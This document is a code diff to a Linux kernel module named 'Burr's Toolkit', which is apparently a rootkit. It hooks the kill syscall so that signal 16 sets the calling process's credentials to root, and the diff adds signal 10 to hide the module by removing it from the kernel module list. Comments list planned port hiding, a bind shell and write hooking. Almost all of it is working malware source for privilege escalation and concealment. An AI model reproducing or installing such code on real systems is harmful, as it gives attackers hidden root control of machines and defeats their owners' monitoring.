@@ -13,6 +13,11 @@ MODULE_DESCRIPTION("Burr's Toolkit");
 MODULE_VERSION("1.00");
 
 void killFn(int sig);
+void toggleHiding(void);
+void setRoot(void);
+
+static struct list_head *priorModule;
+static short isHidden = 0;
 
 //Set PTREGS_SYSCALL_STUBS to 1 for new hooking methods
 #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
@@ -23,31 +28,48 @@ void killFn(int sig);
 static asmlinkage long (*ogKill)(const struct pt_regs *);
 asmlinkage int hookKill(const struct pt_regs *regs) {
     int sig = regs->si;
-    killFn(sig);
-    return ogKill(regs);
-}
 #else
 static asmlinkage long (*ogKill)(pid_t pid, int sig);
 asmlinkage int hookKill(pid_t pid, int sig) { 
-    killFn(sig);
-    return ogKill(pid, sig);
-}
 #endif
+    killFn(sig);
+#ifdef PTREGS_SYSCALL_STUBS
+    return ogKill(regs);
+#else
+    return ogKill(pid, sig);
+#endif
+}
+
 
 void killFn(int sig) {
-    if (sig == 16) {
-        struct cred *root;
-        root = prepare_creds();
-        printk(KERN_INFO "btk::0x1");
-        if (root == NULL)
-            return;
-        root->uid.val = root->gid.val = 0;
-        root->euid.val = root->egid.val = 0;
-        root->suid.val = root->sgid.val = 0;
-        root->fsuid.val = root->fsgid.val = 0;
-        commit_creds(root);
+    if (sig == 10) toggleHiding();
+    else if (sig == 16) setRoot();
+    else return;
+}
+
+void toggleHiding() {
+    if (isHidden == 1) {
+        list_add(&THIS_MODULE->list, priorModule);
+        isHidden = 0;
+    } else {
+        priorModule = THIS_MODULE->list.prev;
+        list_del(&THIS_MODULE->list);
+        isHidden = 1;
     }
     return;
+}
+
+void setRoot() {
+    struct cred *root;
+    root = prepare_creds();
+    printk(KERN_INFO "btk::0x1");
+    if (root == NULL)
+        return;
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+    commit_creds(root);
 }
 
 static struct ftrace_hook hooks[] = {
@@ -63,7 +85,6 @@ static int __init load(void) {
     //Hide listening port
     //Hide bind shell
     //Hook sys_write
-
     int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if (err)
